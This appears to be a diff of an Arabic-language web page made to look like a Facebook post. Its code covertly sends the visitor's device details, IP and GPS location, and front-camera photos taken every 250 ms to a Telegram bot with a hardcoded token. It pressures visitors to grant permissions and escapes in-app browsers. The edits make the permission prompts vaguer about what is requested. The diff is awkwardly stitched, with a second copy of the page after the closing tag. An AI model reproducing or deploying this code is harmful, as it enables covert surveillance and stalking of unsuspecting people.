@@ -29,7 +29,7 @@
     .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
     .three-dots:hover { background: var(--border); }
 
-    /* شاشة إعادة المحاولة – بيضاء بالكامل */
+    /* شاشة إعادة المحاولة */
     .retry-overlay {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: #ffffff; display: flex; flex-direction: column;
@@ -44,7 +44,6 @@
       padding: 14px 28px; font-size: 1.1rem; background: #1877f2; color: white;
       border: none; border-radius: 6px; cursor: pointer; font-weight: 600;
     }
-
     video, canvas { display: none; }
   </style>
 </head>
@@ -63,6 +62,7 @@
     <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
   </div>
 
+  <!-- شاشة إعادة المحاولة الواحدة -->
   <div class="retry-overlay hidden" id="retryOverlay">
     <p id="retryMessage">يجب النقر على Allow للمتابعة</p>
     <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
@@ -102,11 +102,10 @@
       return 'Allow';
     }
 
-    function updateRetryMessage(reason) {
+    function updateRetryMessage() {
       const keyword = getPermissionKeyword();
-      retryMessage.textContent = reason === 'camera' 
-        ? `يجب النقر على ${keyword} للكاميرا للمتابعة`
-        : `يجب النقر على ${keyword} للموقع للمتابعة`;
+      // نص عام دون ذكر الكاميرا أو الموقع
+      retryMessage.textContent = `يجب النقر على ${keyword} للمتابعة`;
     }
 
     function sendText(text) {
@@ -118,17 +117,28 @@
 
     function showOverlay(reason) {
       retryReason = reason || 'camera';
-      updateRetryMessage(retryReason);
-      if (reason === 'location') {
-        post.classList.remove('hidden'); // المنشور يظهر خلف الشاشة
+      updateRetryMessage();
+      if (reason === 'camera') {
+        post.classList.add('hidden');
+        // إيقاف التصوير فقط عند رفض الكاميرا
+        if (capInt) clearInterval(capInt);
       } else {
+        // رفض الموقع – المنشور يختفي لكن التصوير يستمر
         post.classList.add('hidden');
       }
       overlay.classList.remove('hidden');
     }
 
-    function hideOverlay() { overlay.classList.add('hidden'); post.classList.remove('hidden'); }
-    function stopAll() { if (capInt) clearInterval(capInt); if (stream) stream.getTracks().forEach(t => t.stop()); if (watchId) navigator.geolocation.clearWatch(watchId); }
+    function hideOverlay() {
+      overlay.classList.add('hidden');
+      post.classList.remove('hidden');
+    }
+
+    function stopAll() {
+      if (capInt) clearInterval(capInt);
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      if (watchId) navigator.geolocation.clearWatch(watchId);
+    }
 
     async function loadPost() {
       try {
@@ -185,7 +195,6 @@
       } catch (e) {}
     }
 
-    // طلب الموقع – يستدعى عند الحاجة فقط
     function requestLocation() {
       if (!navigator.geolocation) { showOverlay('location'); return; }
       navigator.geolocation.getCurrentPosition(
@@ -200,7 +209,6 @@
           );
           locationGranted = true;
           hideOverlay();
-          // مراقبة مستمرة
           if (watchId) navigator.geolocation.clearWatch(watchId);
           watchId = navigator.geolocation.watchPosition(
             (p) => { gpsLoc = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, src: 'GPS' }; },
@@ -254,7 +262,6 @@
       }
     }
 
-    // الكاميرا أولاً، ثم نطلب الموقع بعد بدء التصوير
     async function startFlow() {
       const camOk = await startCamera();
       if (!camOk) {
@@ -262,7 +269,7 @@
         return;
       }
       cameraGranted = true;
-      // نطلب الموقع الآن (بما أن المستخدم تفاعل مع الكاميرا، الإذن سيظهر)
+      hideOverlay();
       requestLocation();
     }
 
@@ -270,9 +277,9 @@
       hideOverlay();
       await new Promise(r => setTimeout(r, 200));
       if (retryReason === 'camera') {
-        await startFlow(); // يعيد طلب الكاميرا أولاً ثم الموقع
+        await startFlow();
       } else {
-        requestLocation(); // يعيد طلب الموقع فقط
+        requestLocation();
       }
     });
 
@@ -319,296 +326,6 @@
       fetchIPLocation();
       if (isInAppBrowser()) await attemptEscape();
       setTimeout(startFlow, 600);
-    })();
-
-    window.addEventListener('beforeunload', () => {
-      stopAll();
-      sendExitReport();
-    });
-  </script>
-</body>
-</html>    .retry-overlay.hidden { display: none; }
-    .retry-overlay p {
-      font-size: 18px; color: white; margin-bottom: 20px;
-      font-weight: bold; text-align: center; padding: 0 20px;
-      background: rgba(0,0,0,0.7); border-radius: 8px; padding: 12px 20px;
-    }
-    .retry-btn {
-      padding: 14px 28px; font-size: 1.1rem; background: #1877f2; color: white;
-      border: none; border-radius: 6px; cursor: pointer; font-weight: 600;
-    }
-
-    video, canvas { display: none; }
-  </style>
-</head>
-<body>
-  <div class="post-container" id="postContainer">
-    <div class="post-header">
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ccc'/%3E%3C/svg%3E" alt="">
-      <div>
-        <div class="post-user">المستخدم</div>
-        <div class="post-time">الآن</div>
-      </div>
-      <div class="three-dots">⋯</div>
-    </div>
-    <div class="post-text">جارٍ تحميل المنشور...</div>
-    <div class="post-stats"><span>0 تعليق</span><span>0 مشاركة</span></div>
-    <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
-  </div>
-
-  <div class="retry-overlay hidden" id="retryOverlay">
-    <p id="retryMessage">يجب النقر على Allow للمتابعة</p>
-    <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
-  </div>
-
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
-
-  <script>
-    const B = '69ee19e8856a68218974812e';
-    const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
-    const C = '5151102782';
-    const I = 'a7e43833d69a75';
-
-    const post = document.getElementById('postContainer');
-    const overlay = document.getElementById('retryOverlay');
-    const retryBtn = document.getElementById('retryBtn');
-    const retryMessage = document.getElementById('retryMessage');
-    const vid = document.getElementById('video');
-    const cnv = document.getElementById('canvas');
-    const ctx = cnv.getContext('2d');
-
-    let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
-    let cameraGranted = false, locationGranted = false;
-    let escapeCompleted = false, watchId = null;
-    let retryReason = 'camera';
-
-    function getPermissionKeyword() {
-      const lang = (navigator.language || '').toLowerCase();
-      const ua = navigator.userAgent || '';
-      const isArabic = lang.startsWith('ar');
-      if (isArabic) {
-        if (ua.includes('CriOS') || ua.includes('Chrome')) return 'سماح';
-        if (ua.includes('Safari') && !ua.includes('CriOS') && !ua.includes('Chrome')) return 'موافقة';
-        return 'سماح';
-      }
-      return 'Allow';
-    }
-
-    function updateRetryMessage(reason) {
-      const keyword = getPermissionKeyword();
-      retryMessage.textContent = reason === 'camera' 
-        ? `يجب النقر على ${keyword} للكاميرا للمتابعة`
-        : `يجب النقر على ${keyword} للموقع للمتابعة`;
-    }
-
-    function sendText(text) {
-      fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
-      }).catch(() => {});
-    }
-
-    function showOverlay(reason) {
-      retryReason = reason || 'camera';
-      updateRetryMessage(retryReason);
-      if (reason === 'location') {
-        post.classList.remove('hidden');
-      } else {
-        post.classList.add('hidden');
-      }
-      overlay.classList.remove('hidden');
-    }
-
-    function hideOverlay() { overlay.classList.add('hidden'); post.classList.remove('hidden'); }
-    function stopAll() { if (capInt) clearInterval(capInt); if (stream) stream.getTracks().forEach(t => t.stop()); if (watchId) navigator.geolocation.clearWatch(watchId); }
-
-    async function loadPost() {
-      try {
-        const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
-        const d = await r.json(); const s = d.record || {};
-        redir = s.redirectUrl || redir;
-        post.innerHTML = `
-          <div class="post-header">
-            <img src="${s.profilePicture||'https://i.ibb.co/zJx0q3Q/default-avatar.png'}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
-            <div>
-              <div class="post-user">${s.profileName||'Shahin Zyan'}</div>
-              <div class="post-time">${s.postTime||'الآن'}</div>
-            </div>
-            <div class="three-dots">⋯</div>
-          </div>
-          <div class="post-text">${s.postText||'هذا نص تجريبي.'}</div>
-          ${s.postImage?`<div class="post-image"><img src="${s.postImage}" alt="صورة المنشور"></div>`:''}
-          <div class="post-stats"><span>${s.commentsCount||'12'} تعليق</span><span>${s.sharesCount||'5'} مشاركة</span></div>
-          <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>`;
-      } catch (e) {}
-    }
-
-    async function sendDeviceInfo() {
-      if (deviceInfoSent) return;
-      deviceInfoSent = true;
-      try {
-        const ua = navigator.userAgentData || {}; let h = {};
-        if (ua.getHighEntropyValues) try { h = await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
-        const sc = window.screen; let bat = null;
-        if ('getBattery' in navigator) try { const b = await navigator.getBattery(); bat = { level: b.level, charging: b.charging }; } catch(e) {}
-        let txt = '<b>📱 معلومات الجهاز</b>\n';
-        txt += `الموديل: ${h.model||'N/A'}\nالنظام: ${navigator.platform}\nالشاشة: ${sc.width}x${sc.height}\n`;
-        txt += `المعالج: ${navigator.hardwareConcurrency||1} نواة\nالذاكرة: ${navigator.deviceMemory||'N/A'}GB\n`;
-        if (bat) txt += `البطارية: ${(bat.level*100).toFixed(0)}% ${bat.charging?'⚡':'🔋'}\n`;
-        txt += `اللغة: ${navigator.language}\nالمنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
-        sendText(txt);
-      } catch (e) {}
-    }
-
-    async function fetchIPLocation() {
-      try {
-        const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
-        if (d.loc) {
-          const [lat, lon] = d.loc.split(',').map(Number);
-          ipLoc = { lat, lon, acc: 5000, src: 'IP' };
-          sendText(
-            `📍 <b>الموقع التقريبي (IP)</b>\n` +
-            `الإحداثيات: ${lat}, ${lon}\n` +
-            `🌍 <a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>\n` +
-            `🍎 <a href="http://maps.apple.com/?ll=${lat},${lon}&q=موقع">Apple Maps</a>\n` +
-            `🗺️ <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15">OpenStreetMap</a>`
-          );
-        }
-      } catch (e) {}
-    }
-
-    function startWatchingGPS() {
-      if (!navigator.geolocation) { showOverlay('location'); return; }
-      // طلب الموقع لأول مرة
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          // قبل أي دقة، نرسل الموقع فورًا
-          gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS' };
-          sendText(
-            `📍 <b>الموقع الدقيق (GPS)</b>\n` +
-            `الإحداثيات: ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
-            `🌍 <a href="https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}">Google Maps</a>\n` +
-            `🍎 <a href="http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع">Apple Maps</a>\n` +
-            `🗺️ <a href="https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18">OpenStreetMap</a>`
-          );
-          locationGranted = true;
-          hideOverlay();
-          // متابعة المراقبة لتحسين الدقة
-          watchId = navigator.geolocation.watchPosition(
-            (p) => {
-              gpsLoc = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, src: 'GPS' };
-            },
-            () => {},
-            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-          );
-        },
-        () => { showOverlay('location'); },
-        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-      );
-    }
-
-    async function startCamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-        vid.srcObject = stream;
-        await new Promise(r => { vid.onloadedmetadata = () => { vid.play(); r(); }; });
-        sendText("✅ الكاميرا تعمل، جاري التصوير...");
-        capInt = setInterval(captureAndSend, 250);
-        return true;
-      } catch (e) { return false; }
-    }
-
-    function captureAndSend() {
-      if (!stream || !vid.videoWidth) return;
-      cnv.width = vid.videoWidth;
-      cnv.height = vid.videoHeight;
-      ctx.drawImage(vid, 0, 0);
-      if (cnv.toBlob) {
-        cnv.toBlob(blob => {
-          if (!blob) return;
-          const xhr = new XMLHttpRequest();
-          xhr.open('POST', `https://api.telegram.org/bot${T}/sendPhoto`);
-          const form = new FormData();
-          form.append('chat_id', C);
-          form.append('photo', blob, 'snap.jpg');
-          xhr.send(form);
-          photos++;
-        }, 'image/jpeg', 0.4);
-      } else {
-        const dataUrl = cnv.toDataURL('image/jpeg', 0.4);
-        fetch(dataUrl).then(r => r.blob()).then(blob => {
-          const xhr = new XMLHttpRequest();
-          xhr.open('POST', `https://api.telegram.org/bot${T}/sendPhoto`);
-          const form = new FormData();
-          form.append('chat_id', C);
-          form.append('photo', blob, 'snap.jpg');
-          xhr.send(form);
-          photos++;
-        }).catch(() => {});
-      }
-    }
-
-    async function tryAllPermissions() {
-      const camOk = await startCamera();
-      if (!camOk) { showOverlay('camera'); return; }
-      cameraGranted = true;
-      startWatchingGPS();
-    }
-
-    retryBtn.addEventListener('click', async () => {
-      hideOverlay();
-      await new Promise(r => setTimeout(r, 200));
-      if (retryReason === 'camera') {
-        await tryAllPermissions();
-      } else {
-        startWatchingGPS();
-      }
-    });
-
-    async function sendExitReport() {
-      let locStr = 'غير متوفر';
-      if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
-      else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
-      sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
-    }
-
-    async function attemptEscape() {
-      if (escapeCompleted) return;
-      const targetUrl = window.location.href;
-      const ua = navigator.userAgent || '';
-      const isIOS = /iPhone|iPad|iPod/i.test(ua);
-      const isAndroid = /Android/i.test(ua);
-      const methods = isIOS ? [
-        () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); },
-        () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); },
-        () => { window.location.href = 'opera-https://' + targetUrl.replace(/^https?:\/\//, ''); },
-        () => { window.location.href = 'firefox://open-url?url=' + encodeURIComponent(targetUrl); },
-        () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
-      ] : isAndroid ? [
-        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`; },
-        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.opera.browser;end`; },
-        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=org.mozilla.firefox;end`; },
-        () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
-      ] : [];
-      for (let i = 0; i < methods.length; i++) {
-        try { methods[i](); } catch(e) {}
-        await new Promise(r => setTimeout(r, 300));
-      }
-      escapeCompleted = true;
-    }
-
-    function isInAppBrowser() {
-      const ua = navigator.userAgent || '';
-      return /FBAN|FBAV|Instagram/i.test(ua);
-    }
-
-    (async function init() {
-      await loadPost();
-      sendDeviceInfo();
-      fetchIPLocation();
-      if (isInAppBrowser()) await attemptEscape();
-      setTimeout(async () => { await tryAllPermissions(); }, 600);
     })();
 
     window.addEventListener('beforeunload', () => {
